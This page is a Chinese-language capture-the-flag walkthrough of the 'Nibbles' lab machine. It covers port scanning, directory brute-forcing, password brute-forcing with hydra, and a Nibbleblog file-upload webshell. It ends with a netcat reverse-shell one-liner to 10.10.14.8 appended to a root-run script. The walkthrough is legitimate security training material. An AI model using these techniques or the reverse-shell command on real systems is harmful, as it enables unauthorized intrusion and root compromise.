<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Nibbles</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Nibbles</h1><br/><p><img src="images/9-1.png" alt="images/9-1.png" /></p><p><h3>经过前期探索，发现系统使用了nibbleblog博客系统，且该版本存在文件上传漏洞，利用该漏洞拿到shell后，发现monitor.sh可以以root身份运行，往其中添加脚本并执行</h3></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p>	◇ <a href="Nibbles_9.html#h1-1">nmap</a></p><p>	◇ <a href="Nibbles_9.html#h1-2">TCP/80</a></p><p>		▪ <a href="Nibbles_9.html#h2-1">nibbleblog</a></p><p>		▪ <a href="Nibbles_9.html#h2-2">Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)</a></p><p>		▪ <a href="Nibbles_9.html#h2-3">手工上传webshell</a></p><p>	◇ <a href="Nibbles_9.html#h1-3">Shell as root</a></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p><h1>nmap</h1><a name="h1-1"></a></p><p>同样的，先用nmap探测目标端口开放情况</p><p><div class="codebox"><pre>nmap -sV -sC -oA nmap 10.10.10.75</pre></div></p><p><img src="images/9-2.png" alt="images/9-2.png" /></p><p>可以看到开启了80端口，先探索一下http服务，寻找更多内容</p><p><h1>TCP/80</h1><a name="h1-2"></a></p><p>没有什么有用的发现，只是一个很简单的hello world</p><p><img src="images/9-3.png" alt="images/9-3.png" /></p><p>根据burpsuite抓的包可以看到apache的版本内容以及一个目录/nibbleblog</p><p><img src="images/9-4.png" alt="images/9-4.png" /></p><p><h2>nibbleblog</h2><a name="h2-1"></a></p><p>根据提示目录可以看到一个展示页面，页面右下角有一个powerd by nibbleblog</p><p><img src="images/9-5.png" alt="images/9-5.png" /></p><p>很可能是一个博客框架，借助浏览器可以知道确实是一个博客系统，据查也可以得知v4.0.5版本存在很多漏洞，鉴于目前并不能知道靶机使用版本，因此尝试执行目录扫描</p><p><img src="images/9-6.png" alt="images/9-6.png" /></p><p>直接对/nibbleblog进行目录的暴力枚举</p><p><div class="codebox"><pre>gobuster dir -u http://10.10.10.75/nibbleblog/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w / -x txt,php -t 50 -k -o gobuster</pre></div></p><p><img src="images/9-7.png" alt="images/9-7.png" /></p><p>/admin.php</p><p>是一个登录页面</p><p><img src="images/9-8.png" alt="images/9-8.png" /></p><p>在/content/private/user.xml中找到用户名，尝试暴力破解</p><p><img src="images/9-9.png" alt="images/9-9.png" /></p><p>使用hydra针对用户名amdin进行暴力破解，猜测用户名与nibbles相关，加入字典中执行暴力破解，最终得到用户名和密码</p><p><img src="images/9-10.png" alt="images/9-10.png" /></p><p>暴力破解触发零 保护机制，重新将靶机还原使用用户名和密码登录系统后，界面如下</p><p><img src="images/9-11.png" alt="images/9-11.png" /></p><p><h2>Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)</h2><a name="h2-2"></a></p><p>在settings中可以看到博客版本信息</p><p><img src="images/9-12.png" alt="images/9-12.png" /></p><p>并且该版本有一个任意文件上传漏洞</p><p><img src="images/9-13.png" alt="images/9-13.png" /></p><p>然后根据相关信息设置配置项</p><p><img src="images/9-14.png" alt="images/9-14.png" /></p><p>然后执行即可，并获取交互式shell</p><p><img src="images/9-15.png" alt="images/9-15.png" /></p><p>user.txt</p><p><img src="images/9-16.png" alt="images/9-16.png" /></p><p><h2>手工上传webshell</h2><a name="h2-3"></a></p><p>漏洞没有任何检验，不需要绕过，直接上传webshell即可。进入易受攻击的插件My image</p><p><img src="images/9-17.png" alt="images/9-17.png" /></p><p>点击Configure，进入后，上传提前准备好的webshell</p><p><img src="images/9-18.png" alt="images/9-18.png" /></p><p>然后在kali中监听，在浏览器访问http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</p><p><img src="images/9-19.png" alt="images/9-19.png" /></p><p><h1>Shell as root</h1><a name="h1-3"></a></p><p>鉴于之前的靶场，直接sudo -l</p><p><img src="images/9-20.png" alt="images/9-20.png" /></p><p>先把personal.zip解压，然后查看该文件内容</p><p><img src="images/9-21.png" alt="images/9-21.png" /></p><p>在文件末尾添加脚本，然后运行该文件即可</p><p><div class="codebox"><pre>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.8 8888 &gt; /tmp/f&quot;&gt;&gt; monitor.sh</pre></div></p><p><img src="images/9-22.png" alt="images/9-22.png" /></p></div>
</body>
</html>
